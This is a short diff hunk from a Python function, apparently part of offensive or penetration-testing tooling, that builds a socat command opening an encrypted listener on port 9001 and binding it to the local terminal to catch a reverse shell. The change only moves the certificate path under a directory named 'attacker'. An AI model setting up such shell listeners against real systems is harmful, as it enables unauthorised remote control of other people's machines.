@@ -7,7 +7,7 @@ def run_socat_shell(port=9001):
     if shutil.which("kitty"):
         command_str = (
             f"socat openssl-listen:{port},reuseaddr,"
-            "cert=/home/attacker/attacking_program/server.pem,verify=0 "
+            "cert=/home/attacker/attacker/server.pem,verify=0 "
             "file:$(tty),raw,echo=0"
         )
         terminal_cmd = [
